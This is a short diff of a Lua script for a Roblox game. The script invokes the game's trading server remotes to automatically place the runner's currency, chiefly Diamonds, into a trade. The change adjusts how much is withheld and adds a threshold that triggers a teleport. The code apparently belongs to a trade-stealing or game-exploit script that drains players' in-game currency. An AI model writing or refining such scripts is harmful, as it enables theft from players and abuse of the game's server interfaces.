@@ -292,7 +292,7 @@ if game.PlaceId == 8737899170 then
                         [1] = GetTradeID(),
                         [2] = "Currency",
                         [3] = i,
-                        [4] = v._am - 1
+                        [4] = v._am - 1000000
                     }
                     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args)) 
                 end
@@ -305,7 +305,7 @@ if game.PlaceId == 8737899170 then
         if save.Inventory.Currency ~= nil then
             for i,v in pairs(save.Inventory.Currency) do
                 if v.id == 'Diamonds' then
-                    if v._am == nil then
+                    if v._am < 1500000 then
                         local ReplicatedStorage = game:GetService("ReplicatedStorage")
                         local World3Teleport = ReplicatedStorage:WaitForChild("Network"):WaitForChild("World3Teleport")
                         World3Teleport:InvokeServer()
